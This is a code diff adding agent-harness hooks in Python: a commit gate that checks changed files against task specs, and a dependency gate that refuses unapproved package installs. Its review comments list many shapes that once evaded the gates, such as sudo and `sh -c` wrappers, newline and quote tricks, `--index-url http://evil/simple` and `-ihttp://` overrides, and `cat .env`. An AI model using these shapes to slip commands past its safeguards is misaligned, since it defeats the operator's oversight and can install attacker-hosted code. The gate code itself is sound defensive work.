+                    return 3, "spec check: git merge-tree gave no tree", []
+                keep = set(_spec_names(b"\\0".join(parts[1:])))
+                rc, out, err = await git("diff", "--cached", "--name-only",
+                                         "-z", "--no-renames", tree, "--")
+                if rc != 0:
+                    return 3, ("spec check: git diff --cached %s failed: %s"
+                               % (tree, _spec_err(err))), []
+                keep |= set(_spec_names(out))
+                raw = [f for f in raw if f in keep]
+            elif rule == "parents":
+                # Older git, or an octopus merge: the paths that differ
+                # from EVERY parent.
+                for o in mpar:
+                    rc, out, err = await git("diff", "--cached", "--name-only",
+                                             "-z", "--no-renames", o, "--")
+                    if rc != 0:
+                        return 3, ("spec check: git diff --cached %s failed: %s"
+                                   % (o, _spec_err(err))), []
+                    keep = set(_spec_names(out))
+                    raw = [f for f in raw if f in keep]
+        changed = ([f[len(pfx):] for f in raw if f.startswith(pfx)] if pfx
+                   else raw)
+    enf, ch_t = [], set()
+    for f in changed:
+        f = f[2:] if f.startswith("./") else f
+        if not f:
+            continue
+        if f.endswith("/"):
+            return 3, ("spec check: '%s' ends in \\"/\\": pass file paths, "
+                       "not directories" % _spec_disp(f)), []
+        # A task file in the change set: the refusal names it first.
+        if f.startswith(".claude/specs/") and "/tasks/" in f[14:]:
+            ch_t.add(f)
+        if f.startswith(tuple(prefixes)):
+            enf.append(f)
+    if not enf:
+        return 0, "", []
+    # [WP3 fix2 MR-5] Stage 0 only: an unmerged task file is not yet in
+    # what the commit records (spec-check.sh's comment).
+    rc, out, err = await git("--literal-pathspecs", "ls-files", "-z",
+                             "--stage", "--", pfx + ".claude/specs")
+    if rc != 0:
+        return 3, "spec check: git ls-files failed: " + _spec_err(err), []
+    tasks, have_index = [], False
+    for rec in out.split(b"\\0"):
+        meta, _tab, path = rec.partition(b"\\t")
+        if not rec or meta.rsplit(b" ", 1)[-1] != b"0":
+            continue
+        p = os.fsdecode(path)
+        p = p[len(pfx):] if p.startswith(pfx) else p
+        if p == ".claude/specs/INDEX.md":
+            have_index = True
+            continue
+        if _spec_is_task_or_index(p):
+            tasks.append(p)
+    if task:
+        task = task[2:] if task.startswith("./") else task
+        if task not in tasks:
+            return 3, ("spec check: --task " + task + " is not a task file "
+                       "in the index (.claude/specs/<slug>/tasks/<file>)"), []
+        tasks, have_index = [task], False
+    stat, hasb, entries, legacy = {}, {}, [], []
+    names = [pfx + p for p in tasks]
+    if have_index:
+        names.append(pfx + ".claude/specs/INDEX.md")
+    try:
+        tmpd = tempfile.TemporaryDirectory(prefix="spec-check.")
+    except OSError:
+        return 3, "spec check: cannot create a temporary directory", []
+    with tmpd as tmp:
+        rc, _out, err = await git(
+            "-c", "core.symlinks=false", "checkout-index", "-z", "--stdin",
+            "--prefix=" + tmp + "/",
+            inp=b"".join(os.fsencode(n) + b"\\0" for n in names))
+        if rc != 0:
+            return 3, "spec check: git checkout-index failed: " + _spec_err(err), []
+
+        def read(n):
+            # A gitlink under tasks/ comes out as an empty directory: an
+            # empty file, as in spec-check.sh.
+            try:
+                with open(os.path.join(tmp, n), "rb") as fh:
+                    return fh.read().decode("utf-8", "surrogateescape")
+            except OSError:
+                return ""
+        for p in tasks:
+            text = read(pfx + p)
+            stat[p], hasb[p], ents = _spec_parse_task(text)
+            entries.extend((p, e) for e in ents)
+            if not hasb[p]:
+                legacy.append(text)
+        if have_index:
+            legacy.append(read(pfx + ".claude/specs/INDEX.md"))
+
+    aff = set()   # tasks whose Files: block lists a path of this change
+
+    def covered(f):
+        for p, e in entries:
+            if f == e or (e.endswith("/") and f.startswith(e)):
+                aff.add(p)
+                return True
+        if not legacy or "\\n" in f:
+            return False
+        # The pre-WP3 rule: a word-bounded mention of the path or its bare
+        # file name. The classes are spec-check.sh's under LC_ALL=C.
+        b = f.rsplit("/", 1)[-1]
+        alts = [re.escape(f), re.escape(b)]
+        if pfx:
+            # [WP3 fix2 MR-7] the path from the repository top too.
+            alts.append(re.escape(pfx + f))
+        pat = re.compile(r"(^|[^A-Za-z0-9_./-])(" + "|".join(alts)
+                         + r")([^A-Za-z0-9_-]|$)", re.M)
+        return any(pat.search(t) for t in legacy)
+
+    miss = [f for f in enf if not covered(f)]
+    if not miss:
+        return 0, "", []
+    # The naming order of spec-check.sh: --task; a task file this change
+    # stages; the in-progress tasks (several: those whose Files: block lists
+    # another path of this change); the only open task with a Files: block;
+    # the open tasks.
+    if task:
+        cand, why = [task], "the task given to this check"
+    else:
+        cand = [p for p in tasks if p in ch_t]
+        why = "staged in this commit"
+    if not task and not cand:
+        cand = [p for p in tasks if stat.get(p) == "in-progress"]
+        why = "status: in-progress"
+        a = [p for p in cand if p in aff]
+        if len(cand) > 1 and a:
+            cand = a
+            why = ("status: in-progress, and its Files: block lists other "
+                   "files of this change" if len(a) == 1 else
+                   "status: in-progress, each listing other files of this "
+                   "change")
+        if not cand:
+            opn = [p for p in tasks if stat.get(p) not in ("done", "validated")]
+            opnb = [p for p in opn if hasb.get(p)]
+            if len(opnb) == 1:
+                cand, why = opnb, "the only open task with a Files: block"
+            elif opn:
+                cand, why = opn, "open tasks"
+    # The remedy follows the form of this commit (spec-check.sh's FORM).
+    gif = os.environ.get("GIT_INDEX_FILE", "")
+    if (fnmatch.fnmatchcase(gif, "next-index-*.lock")
+            or fnmatch.fnmatchcase(gif, "*/next-index-*.lock")):
+        form = "paths"
+    elif gif == "index.lock" or fnmatch.fnmatchcase(gif, "*/index.lock"):
+        form = "all"
+    else:
+        form = "plain"
+    rc, _out, _ = await git("rev-parse", "-q", "--verify", "HEAD")
+    unborn = rc != 0
+    stage = "stage that file (git add) and commit again"
+    stage1 = "stage it (git add) and commit again"
+    unst_head = ("Not counted, because the index does not have them (task "
+                 "files are read from what the commit records; stage them "
+                 "with git add):")
+    if seq:
+        # [WP3 fix2 MR-1, MR-2, IT-4] spec-check.sh's merge remedy: what the
+        # listed files are, by the rule that kept them, and what to do, by
+        # the mode and by whether merge-back runs the check.
+        if seq == "merge":
+            what = ("a conflict resolution, or an edit made during the merge"
+                    if rule == "auto" else
+                    "a conflict resolution, an edit made during the merge, or "
+                    "a file both sides changed")
+            it, in_, drop, abort = ("a merge", "the merge itself",
+                                    "the other side's change",
+                                    "git merge --abort")
+        else:
+            # [WP3 fix3 MR2-4] The whole change has its own reason on git
+            # 2.40 or later (spec-check.sh).
+            if rule == "auto":
+                what = ("a conflict resolution, or an edit made while it was "
+                        "stopped")
+            elif rule == "old":
+                what = ("this git, older than 2.40, cannot tell the "
+                        "resolution from the rest of the change, so this is "
+                        "all of it")
+            elif seq == "am":
+                what = ("git am applies a patch, not a commit, so the "
+                        "resolution cannot be told from the rest of it: this "
+                        "is all of it")
+            elif pick:
+                what = ("its commit is a merge or has no parent, so the "
+                        "resolution cannot be told from the rest of the "
+                        "change: this is all of it")
+            else:
+                what = ("git names no commit it is replaying here, as at an "
+                        "exec or break stop, so this is all of the change")
+            # [WP3 fix3 MR2-3, MR2-5] A stopped rebase or git am; a revert
+            # that ran with --no-commit leaves REVERT_HEAD too.
+            it, in_, drop, abort = {
+                "pick": ("a cherry-pick that stopped on conflicts", "it",
+                         "part of the picked commit",
+                         "git cherry-pick --abort"),
+                "revert": ("a revert that stopped on conflicts or ran with "
+                           "--no-commit", "it", "part of the revert",
+                           "git revert --abort"),
+                "rebase": ("a rebase that stopped", "it",
+                           "part of that commit", "git rebase --abort"),
+                "am": ("a git am that stopped", "it", "part of the patch",
+                       "git am --abort")}[seq]
+        last = "This is %s, and these files changed in %s (%s)." % (
+            it, in_, what)
+        if mode != "warn":
+            # [WP3 fix4 RR3-CHK-1, fix5 R4-3] What a stopped rebase lets the
+            # agent unstage (spec-check.sh).
+            if seq == "rebase" and pick:
+                last += (" It replays the commit REBASE_HEAD names (git show "
+                         "--stat REBASE_HEAD lists its files). Until that "
+                         "commit is made (it is made if git rev-parse HEAD "
+                         "REBASE_HEAD prints one object name twice), do not "
+                         "unstage a file it changed: that drops %s. Any "
+                         "other file can be unstaged (git restore --staged "
+                         "<path>), and so can any file once that commit is "
+                         "made." % drop)
+            elif seq == "rebase":
+                last += (" Any file here can be unstaged (git restore "
+                         "--staged <path>).")
+            else:
+                last += " Do not unstage a file from it: that drops %s." % drop
+            if os.environ.get("BOOTSTRAP_MERGE_BACK") == "1":
+                stage = stage1 = "as merge-back's Remedy below says"
+                last += (" merge-back's Remedy, below, says who makes the fix "
+                         "and what runs next.")
+            else:
+                last += (" Fix the task file as above, or run %s, then stop "
+                         "and ask." % abort)
+    elif form == "paths":
+        stage = ("then commit again with that file named in the same "
+                 "command (git commit <paths> <task file>)")
+        stage1 = ("then commit again with it named in the same command (git "
+                  "commit <paths> <task file>)")
+        unst_head = ("Not counted, because this commit does not record them "
+                     "(a commit that names paths records only those; name "
+                     "them in the same command):")
+        last = ("If a file does not belong to the task, leave it out of the "
+                "paths you name, or stop and ask.")
+    elif form == "all":
+        last = ("If a file does not belong to the task, commit the task's "
+                "paths by name instead (git commit -- <paths>): commit -a and "
+                "--include stage tracked changes themselves, so unstaging "
+                "does not leave a file out. Or stop and ask.")
+    elif unborn:
+        last = ("If a file does not belong to the task, unstage it (git rm "
+                "--cached <path>; this is the first commit) or stop and ask.")
+    else:
+        last = ("If a file does not belong to the task, unstage it (git "
+                "restore --staged <path>) or stop and ask.")
+    clean = [_spec_disp(f) for f in miss]
+    n = len(miss)
+    what = "1 changed file is" if n == 1 else "%d changed files are" % n
+    lines = ["spec check: %s not listed in any task file's Files: block:"
+             % what]
+    lines += ["  " + f for f in clean]
+    if pfx:
+        lines.append("Paths here are from the project directory, %s in the "
+                     "repository." % _spec_disp(pfx))
+    if len(cand) == 1:
+        c = _spec_disp(cand[0])
+        if hasb.get(cand[0]):
+            lines.append('To trace them, edit %s (%s) with the Edit tool: add '
+                         'these lines under its "Files:" line, %s:'
+                         % (c, why, stage))
+        else:
+            lines.append('To trace them, edit %s (%s) with the Edit tool: add '
+                         'a line that is exactly "Files:" followed by these '
+                         'lines, %s:' % (c, why, stage))
+    elif len(cand) > 1:
+        lines.append('To trace them, edit the task file this change belongs '
+                     'to with the Edit tool: add these lines under its '
+                     '"Files:" line, %s:' % stage)
+    else:
+        lines.append('No open task file exists (.claude/specs/<slug>/tasks/'
+                     '<id>.md). /spec-decompose <slug> writes task files with '
+                     'a Files: block; or create one with the Write tool, with '
+                     'a line that is exactly "Files:" followed by these '
+                     'lines, %s:' % stage1)
+    lines += ["- " + f for f in clean]
+    unst = []
+    for args in (("--literal-pathspecs", "ls-files", "-z", "--others",
+                  "--exclude-standard", "--", pfx + ".claude/specs"),
+                 ("--literal-pathspecs", "diff", "--name-only", "-z", "--",
+                  pfx + ".claude/specs")):
+        rc, out, _ = await git(*args)
+        if rc == 0:
+            for p in _spec_names(out):
+                p = p[len(pfx):] if p.startswith(pfx) else p
+                if _spec_is_task_or_index(p):
+                    unst.append(p)
+    if unst:
+        lines.append(unst_head)
+        lines += ["  " + _spec_disp(p) for p in unst]
+    if len(cand) > 1:
+        lines.append("Candidate task files (%s):" % why)
+        for k, p in enumerate(cand):
+            if k >= _SPEC_CAND_CAP:
+                lines.append("  (and %d more)" % (len(cand) - _SPEC_CAND_CAP))
+                break
+            lines.append("  " + _spec_disp(p))
+    lines.append('A directory entry ending in "/" (for example src/gen/) '
+                 'covers every file below it, even after its task is done: '
+                 'use one only for files whose names cannot be known in '
+                 'advance, such as generated code, and otherwise list each '
+                 'file. If Claude Code refuses the edit, stop and ask; do not '
+                 'write the task file another way (a shell redirect or a '
+                 'script). ' + last)
+    return 2, "\\n".join(lines), clean
+
+
+def _spec_ctx(text):
+    """additionalContext, capped as spec-gate-commit.sh's _json_str cap."""
+    raw = text.encode("utf-8")
+    if len(raw) > 4000:
+        text = raw[:4000].decode("utf-8", "ignore") + "\\n[truncated]"
+    return {"hookSpecificOutput": {"hookEventName": "PreToolUse",
+                                   "additionalContext": text}}
+
+
+def _spec_gate_commit(config):
+    hooks_cfg = (config or {}).get("hooks") or {}
+    # [WP3 critic 1g] No default here: DEFAULTS is the mode's one default,
+    # carried in the resolved config (and RESOLVED_CONFIG). Only "block"
+    # refuses; a config that does not carry the key never does.
+    mode = hooks_cfg.get("spec_gate_commit_mode")
+    prefixes = tuple(hooks_cfg.get("spec_gate_commit_prefixes")
+                     or _ENFORCED_PREFIXES)
+
+    async def spec_gate_commit(input_data, tool_use_id, context):
+        # [WP3 / D2] The FALLBACK, as spec-gate-commit.sh: defer to the git
+        # pre-commit hook when it is installed; otherwise run the check on
+        # the index as it stands before the command.
+        cmd = _cmd_of(input_data)
+        # [WP3 fix2 MR-6] Also a merge, cherry-pick or revert concluded with
+        # --continue: it runs git commit, and below the repository top (no
+        # git hook) this is the only check.
+        if not (_git_verb(cmd, "commit")
+                or _git_verb(cmd, r"(?:merge|cherry-pick|revert)\\s+--continue")):
+            return {}
+        proj = _proj()
+        # [critic r3] No repository: nothing to check (as the shell twin).
+        try:
+            _rc, _out, _ = await _run(["git", "rev-parse",
+                                       "--is-inside-work-tree"],
+                                      cwd=proj, shell=False)
+        except OSError:
+            _rc = 1
+        if _rc != 0:
+            return {}
+        if await _spec_git_hook_installed(proj):
+            return {}
+        rc, msg, _miss = await _spec_check(proj, prefixes, mode=mode)
+        if rc == 0:
+            return _spec_ctx(msg) if msg else {}
+        note = await _spec_fallback_note(proj)
+        _prc, _pout, _ = await _spec_git(proj, "rev-parse", "--show-prefix")
+        if _prc == 0 and _spec_line(_pout):
+            note = _SPEC_FALLBACK_NOTE_BELOW
+        if rc == 2:
+            if mode == "block":
+                return _deny(msg + "\\nCommit refused. " + note)
+            return _spec_ctx(
+                msg + "\\nhooks.spec_gate_commit_mode is warn, so this commit "
+                "was allowed; fix what it names before your next commit. "
+                + note)
+        if mode == "block":
+            # [WP3 critic 1c] the shell fallback's hook_fail text.
+            return _deny("BLOCKED (fail-closed): the spec check could not run "
+                         "(exit %d), which is not a spec refusal: %s. Stop and "
+                         "tell the operator: hooks.spec_gate_commit: false "
+                         "and a re-install turn the check off." % (rc, msg))
+        return _spec_ctx("spec-gate-commit: the spec check could not run "
+                         "(exit %d), so this commit was not checked: %s"
+                         % (rc, msg))
+    return spec_gate_commit
+
+
+# [upstream P2-1, decision recorded] CANONICAL SUBSTRATE = THE SHELL SUITE.
+# The shell is the default gate_substrate, ships on every install, and
+# carries 11 gates to this module's 7. The binding rule is therefore: this
+# module MUST NOT allow what the shell blocks, and MUST NOT block what the
+# shell allows. Where the two disagreed, five dependency cases the shell
+# allowed this module denied, and the reverse held on commits - so whichever
+# substrate was live changed project behavior completely.
+#
+# [lens A F7 / lens B finding 8] THAT RULE WAS ASSERTED AND NOT TRUE. At
+# v2.6.0 it was violated in BOTH directions at once: this module allowed
+# `cat .env` on the Bash surface (which the shell blocked, because
+# _GATE_MATCHERS carried no Bash entry for secrets-gate), and it denied
+# `python3 -m pip install evil` and a docs-only `git commit` (which the shell
+# allowed, because ENFORCED_PREFIXES was never ported). Seven confirmed
+# disagreements survived a commit message claiming "all 13 disputed cases now
+# agree". The rule is now enforced by a TEST rather than by this comment:
+# tests/test_substrate_differential.py pushes one payload corpus through the
+# emitted shell hooks AND build_hooks(RESOLVED_CONFIG) and fails on any
+# verdict that differs. Note what "canonical" means in the two cases where
+# the SHELL was the weaker substrate (the chained-install fail-open, the
+# unanchored eval-gate): reconcile to the shell's INTENT, never copy its bug.
+#
+# [upstream P1-4 port] Matching is anchored to COMMAND POSITION, not a bare
+# substring. `"git commit" not in cmd` had the identical weakness as the
+# shell's `case *"git commit"*`: it missed `git  commit`, a tab,
+# `git --no-pager commit` and `git -C /repo commit`, and it fired on the
+# string appearing in a comment, a quoted argument or a grep pattern.
+# Command-position prefixes that do not change WHICH program runs.
+#
+# [round-2 review F-401] The redirection / brace / keyword arms are new on
+# BOTH substrates: `>/dev/null pip install evil`, `time pip install evil`,
+# `{ pip install evil; }` and `if true; then pip install evil; fi` all
+# evaded the anchor with one token.
+#
+# [round-4 D3/D9] `_CMD_PFX_RE` is now INTERPOLATED from lib/cmdpos.py, in
+# the emitted prelude, together with the two membership sets. The version
+# that used to be written here carried `env|sudo` plus six transparent
+# commands, against the shell's twelve-plus - the comment above it claimed
+# "same alternation in the same order" and had been false for two commits.
+# It also could not consume a wrapper's POSITIONAL, which is D9: `sudo -u
+# root pip install evilpkg` was rc=0 on both substrates at all three commits.
+# [round-2 review F-381] RE-SYNCED to the shell's cmd_has_verb. The shell
+# was rewritten by the round-2 review - newline as a command separator, sudo/VAR=/path
+# prefixes - and this template was left at the v2.6.0 form, so the SDK
+# ALLOWED what the shell blocked across test-gate, spec-gate-commit and
+# eval-gate: `git add -A` + newline + `git commit`, `sudo git commit`,
+# `FOO=1 git commit`, `/usr/bin/git commit`, `env GIT_AUTHOR=x git commit`.
+# That is the direction this module's binding rule forbids, and `git show
+# 4cc9742` proves the two anchors AGREED at the parent - the divergence was
+# created by the batch that rewrote one side. The differential's verb corpus
+# was entirely single-line and unprefixed, which is why 107/107 held over
+# it; batch 1 added those shapes before this fix landed.
+_GIT_VERB_TMPL = (r"(?:^|[;&|()`\\n])\\s*" + _CMD_PFX_RE + r"(?:\\S*/)?git"
+                  r"(?:\\s+-[Cc]\\s+(?:[^-\\s]\\S*|-)|\\s+-\\S+)*\\s+%s(?:\\s|$)")
+
+
+def _git_verb(cmd, verb):
+    """True if `cmd` invokes `git <verb>` at a command position.
+
+    [round-3 lens A, A5] Runs over quote-aware SEGMENTS rather than the raw
+    string. Searching the raw string treated a newline as a separator even
+    inside a quoted value, so `git -c a.b="p<newline>q" commit` put the verb
+    off command position and every command gate allowed it. Shell parity
+    (cmd_has_verb over cmd_segments).
+
+    [round-4 D1, THE SDK HALF] `_expand_invoker_args` was missing here, and
+    only `_scan_install_line` ever called it. So an invoker's argument was a
+    command line for dependency-gate and opaque data for every VERB gate:
+
+        sh -c 'git commit -m x'      shell=deny  SDK=allow
+        bash -c / zsh -c / dash -c / eval / busybox sh -c / ssh box - same
+
+    That is test-gate, spec-gate-commit and eval-gate simultaneously, in the
+    direction this module's own binding rule forbids, and it accounts for the
+    entire SDK half of the wrapper class. A fixer who repairs only what D1's
+    SHELL cause names (`_cs_isinv`) leaves every one of them open - which is
+    what the round-4 brief flags and what makes this one line load-bearing.
+    """
+    pat = _GIT_VERB_TMPL % verb
+    return any(re.search(pat, " " + _flatten_seg(seg) + " ")
+               for seg in _expand_invoker_args(
+                   _lift_subs(cmd, _CMD_OPS)))
+
+
+# Command-position prefixes that do not change WHICH program runs, so the
+# install verb is still the verb. Shell parity (the shell gate's PFX) - the
+# same _CMD_PFX_RE the git-verb anchor uses, so the two anchors cannot drift
+# apart again the way F-381 let them.
+_PREFIX = _CMD_PFX_RE
+# An install invocation at the START of a segment - not merely present
+# somewhere in it. The tail after the prefix run - the tool words, the
+# install verbs, the run-without-installing channels (`npx evil`, `pnpm dlx
+# evil`: fetching and EXECUTING an unapproved package is the same arrival,
+# and not installing it first is not a mitigation) and the `uv pip install`
+# arm whose verb is `pip` - is _INSTALL_TAIL, rendered from lib/cmdpos.py
+# (install_head_tail) in the emitted prelude. _TOOLS/_VERBS used to be
+# literals HERE plus a second set in the shell body: the D3 two-copies
+# shape, and the reason a one-substrate fix could silently miss. Shell
+# parity (HEAD) is now BY CONSTRUCTION - the two anchors are one rendering.
+# [issue #36, spelling updated by #40] The interpreter word followed by
+# `-m` is a transparent COMMAND-POSITION
+# PREFIX inside that tail - the treatment sudo/env/timeout get - so
+# `-m pipx install`, `-m poetry add`, `-m pipenv install` and `-m uv pip
+# install` are re-judged by the arms that already refuse their direct
+# spellings. The old anchor spelled `python -m pip install` as ONE literal
+# arm, so every other installer walked through behind `-m`.
+# [X-32 repair F14, revised by #36] The ATTACHED `-mpip` spelling was allow
+# on both substrates at 2.6.1 and the repair widened the literal to
+# `-m\\s*pip`. Its claim that `-mpipx install` must NOT match is retired ON
+# PURPOSE: the module after `-m` is what runs, so `-mpipx` is pipx and now
+# matches like every other attached spelling. Consistent with #32's finding
+# that `-m` is NOT a program flag for the pipe rule - both say the module
+# is what runs; there it keeps stdin the program, here it makes the module
+# the installer.
+_INSTALL_HEAD = re.compile(r"^\\s*" + _PREFIX + _INSTALL_TAIL)
+# [lens A F3 residue] A package-index override redirects even an APPROVED
+# package to another server, which no package-name check can see. Tested
+# against the matched HEAD only - an assignment that is genuinely a
+# command-position prefix of an install - so prose naming the variable does
+# not block. Shell parity (_IDX_RE).
+_INDEX_OVERRIDE = re.compile(
+    r"(?:^|\\s)(?:PIP_INDEX_URL|PIP_EXTRA_INDEX_URL|PIP_FIND_LINKS"
+    r"|UV_INDEX_URL|UV_EXTRA_INDEX_URL|NPM_CONFIG_REGISTRY"
+    r"|npm_config_registry|YARN_REGISTRY|YARN_NPM_REGISTRY_SERVER"
+    r"|COMPOSER_REPOSITORIES|GOPROXY|GEM_SOURCE)=")
+# Shell separators. A line is split into segments and each is judged on its
+# own; see _scan_install_line. Parens included so `(cd sub && pip install
+# evil)` segments the same way the shell's cmd_segments does.
+_SEGMENT = re.compile(r"[;&|()]")
+# Remote-script execution: same "unapproved software arrives" class, with no
+# inspectable package name, so it is always denied (shell parity).
+# [round-4 D16/D20] Defined in the emitted prelude from lib/cmdpos.py:
+#   _PIPE_TO_SHELL   _PIPE_TAIL   _DOWNLOADERS   _INTERPRETERS   _REMOTE_RUN
+#   _UV_WITH
+# [lens A F9] Value-taking flags. The v2.6.0 list was seven entries long, so
+# every other value-taking flag left its argument to be read as a package
+# name and the gate blocked - naming the wrong token:
+#   pip install --index-url <url> requests
+#     -> "not in deps.md approved list: https://..."
+# The list is long but the safety does not rest on its completeness: a flag
+# consumes the following token ONLY IF that token is value-SHAPED. That
+# inversion is what makes it safe to include short flags whose meaning
+# differs by ecosystem - `npm install -f evil` and `npm install -d evil`
+# must still block `evil`, and they do, because `evil` is package-shaped.
+# Shell parity.
+_VALUE_FLAGS = frozenset({
+    "--no-binary", "--only-binary", "--platform", "--python-version", "--implementation",
+    "--abi", "--progress-bar", "--cache-dir", "--log", "--proxy", "--cert",
+    "--client-cert", "--trusted-host", "--config-settings", "--report",
+    "--timeout", "--retries", "--exists-action", "--upgrade-strategy",
+    "--src", "-e", "--editable", "-t", "--target", "--prefix", "--root",
+    "-d", "--dest", "--userconfig", "--globalconfig",
+    "--cache", "--workspace", "-w", "--omit", "--include",
+    "--install-strategy", "--before", "--tag", "--scope", "--access",
+    "--store-dir", "--virtual-store-dir", "--modules-folder", "--reporter",
+    "--filter", "--dir", "-C", "--manifest-path", "--features",
+    "--branch", "--rev", "--path", "-p", "--package", "--profile",
+    "--bin", "--example", "--vers", "-f",
+})
+# [round-2 review F-1357] A package-index override on the COMMAND LINE is
+# the same attack as the environment-variable spelling _INDEX_OVERRIDE
+# already refuses, and it was being SKIPPED as an ordinary flag value: `pip
+# install --index-url http://evil/simple requests` allowed while
+# `PIP_INDEX_URL=http://evil/simple pip install requests` was blocked, from
+# the same reason string in the same module. `cargo add --git <url>` is the
+# extreme case - an arbitrary source with no package name at all.
+# Consuming the value and then checking the package name proves nothing,
+# because the flag redirects even an APPROVED package.
+# BARE `-f` is deliberately absent: it is pip's --find-links but npm's
+# --force, and blaming the wrong one gives worse advice than an ordinary
+# value flag. That exemption is for the SEPARATED spelling only - the
+# ATTACHED `-f<value>` is caught below, as the shell catches it.
+# Shell parity.
+_SRC_OVERRIDE_REASON = (
+    "Dependency gate: a remote source override is not verifiable.\\n"
+    "'%s %s' redirects even an APPROVED package to another server. "
+    "Remove it,\\nor set the source in the project's own package-manager "
+    "config (pip.conf, .npmrc, .cargo/config.toml)."
+)
+_INDEX_FLAGS = frozenset({
+    "-i", "--index-url", "--extra-index-url", "--find-links", "--registry",
+    "--index", "--git", "--repo",
+    # `--default-index` and `--index-strategy` are uv's spellings and are in
+    # the shell's arm; they were missing here, and the miss was not cosmetic.
+    # `pip install --default-index ./localwheels requests` was shell=deny /
+    # sdk=ALLOW at v2.7.1: the unknown long flag fell through
+    # `tok.startswith("-")`, its value was a LOCAL PATH so the local-path arm
+    # skipped it too, and the only remaining token was an approved package.
+    # The URL spelling agreed by accident - the URL was read as a package
+    # name and refused as unapproved, which is also why
+    # `--index-strategy unsafe-best-match` denied with "not in deps.md
+    # approved list: unsafe-best-match", the exact unactionable advice
+    # F-1357 was filed to remove. Shell parity, name for name.
+    "--default-index", "--index-strategy",
+})
+# THE ATTACHED SPELLING OF THE SAME OVERRIDE, which this frozenset cannot
+# express because it is EXACT-MATCH. The shell's index arm ends with the globs
+# `-i?*|-f?*`, so `pip install -ihttp://evil/simple requests` denies there;
+# here the attached token matched no entry above, fell through
+# `if tok.startswith("-"): continue` as an ordinary flag, and the line was
+# ALLOWED - SDK-more-permissive, the forbidden direction, and a real
+# capability grant rather than a cosmetic split: an index override redirects
+# even an APPROVED package to an attacker's server, and `requests` in that
+# example IS on the approved list. Measured at v2.7.1, shell=deny/sdk=allow
+# for `-ihttp://`, `-fhttp://`, `uv pip install -ihttp://` and
+# `python3 -m pip install -ihttp://`.
+#
+# The shell's `?` requires ONE character after the flag, so a two-character
+# token never matches it and must not match here either: BARE `-f` stays npm's
+# --force, an ordinary value flag on both substrates (`npm install -f` allows;
+# `npm install -f 0` still blocks `0` by package name, via _VALUE_FLAGS and
+# _is_flag_value). Bare `-i` is already an exact entry above. Shell parity,
+# glob for glob.
+_ATTACHED_INDEX_PREFIXES = ("-i", "-f")
+
+
+def _is_attached_index_flag(tok):
+    """True for the attached `-i<value>` / `-f<value>` index overrides.
+    Shell parity (the `-i?*|-f?*` globs); bare `-i`/`-f` are excluded by the
+    length test exactly as the shell's `?` excludes them."""
+    return len(tok) > 2 and tok[:2] in _ATTACHED_INDEX_PREFIXES
+
+
+# [round-2 review] See the shell gate's is_flag_value for the full account. The
+# first version matched `=` and `^[0-9]` and therefore swallowed real
+# package names - `7zip-bin`, `0x`, `2to3`, `evil==1.0` - as if they were
+# flag values, installing them unapproved on BOTH substrates.
+_FLAG_VALUE_SHAPE = re.compile(r"^$|://|^:|^\\.$|^\\./|^\\.\\./|^/|^~")
+# `==` `>=` `<=` `~=` `!=` `<` `>` are pip/npm PACKAGE syntax, not flag
+# values, and every one of them contains or implies `=`, so they are tested
+# first.
+_VERSION_SPEC = re.compile(r"==|>=|<=|~=|!=|<|>")
+# [round-2 review F-1313] Requires a DOT. `^[0-9.]+$` alone still swallowed
+# SINGLE-CHARACTER numeric names, and `0`, `1` and `2` are all real npm
+# registry packages: `npm install -f 0`, `npm install -p 1` and `npm i -w 2`
+# each installed unapproved on both substrates. Identical class to the
+# `7zip-bin`/`0x`/`2to3` hole the previous round fixed, narrowed by one
+# character - the third consecutive round this predicate shipped a hole.
+# Cost: a dotless flag value (`--python-version 3`) is now read as a package
+# name and named in the refusal, which is the over-match direction a
+# deny-list wants. Shell parity (is_flag_value).
+_BARE_INT = re.compile(r"^[0-9]+$")
+_BARE_VERSION = re.compile(r"^[0-9]+(?:\\.[0-9]+)+$")
+
+
+def _is_flag_value(tok, flag=""):
+    """True if `tok` could NOT be a package name and is therefore the
+    preceding flag's value. Shell parity (is_flag_value)."""
+    if _FLAG_VALUE_SHAPE.search(tok):
+        return True
+    if _VERSION_SPEC.search(tok):
+        return False
+    if "=" in tok:
+        return True
+    if _BARE_VERSION.match(tok):
+        return True
+    # [round-3 lenses A/C] A bare INTEGER after an unambiguous long flag is
+    # that flag's value (`--timeout 60`, `--retries 5`); after a one-letter
+    # flag whose meaning differs by ecosystem (`-f` is pip's --find-links
+    # and npm's --force) it is assumed to be a package name, which is what
+    # `0`, `1` and `2` actually are on npm. Shell parity (is_flag_value).
+    return bool(_BARE_INT.match(tok)) and flag.startswith("--")
+
+
+def _pkg_name(tok):
+    # Package name minus version/spec. npm SCOPED packages start with '@'
+    # (@scope/pkg[@ver]); splitting on '@' first would blank the whole
+    # token and fail open, so the leading scope '@' is preserved and only
+    # a LATER version separator is stripped.
+    if tok.startswith("@"):
+        return "@" + re.split(r"[<>=@~ ]", tok[1:], maxsplit=1)[0]
+    return re.split(r"[<>=@~ ]", tok, maxsplit=1)[0]
+
+
+def _dependency_gate(config):
+    approved = set(config["deps"]["approved"])
+
+    async def dependency_gate(input_data, tool_use_id, context):
+        # Block package installs not on the approved list. Every token
+        # after the install/add verb is inspected (shell S-2 semantics);
+        # value-taking flags consume the next token. Spaces/tabs are
+        # collapsed so tab-separated or multi-space invocations (and
+        # `python -m pip install`) cannot slip past the verb match -
+        # but NEWLINES are preserved (collapsing them would merge a
+        # multi-line command whose message merely mentions an install
+        # verb across a line break, false-blocking a legitimate commit).
+        blocked = ""
+        # [round-4 D6] ONE scan over the WHOLE command, not one per LINE.
+        # `cmd.splitlines()` ran BEFORE any quote tracking, so an unbalanced
+        # quote earlier in the command hid everything after it: each line was
+        # parsed independently, the line carrying the stray quote swallowed
+        # the rest of ITSELF, and the following lines were never reached in
+        # the same quote state the shell would be in.
+        #
+        #     echo "a<newline>b" ; pip install evilpkg     shell=2  SDK=0
+        #
+        # `_scan_install_line` already segments quote-awarely and `_CMD_OPS`
+        # already contains a newline, so passing the whole string preserves the
+        # property the old comment claimed newline-splitting was protecting
+        # (a multi-line commit message whose text merely mentions an install
+        # verb is one quoted run, and stays one segment) while removing the
+        # fail-open. The name is now a misnomer and the docstring says so.
+        #
+        # [batch 30-33 close pass] ...and over BOTH SPELLINGS. `approved` is
+        # an ALLOW list, so lib/cmdpos.py's "THE FOLD IS DENY-ONLY" applies:
+        # folding `requests$''` to `requests` hands it an approval it never
+        # had, and a pristine 2.6.1 install denies all sixteen decorated
+        # package spellings this gate was allowing. The chunk tuple was
+        # already the seam for scanning more than one string; the unfolded
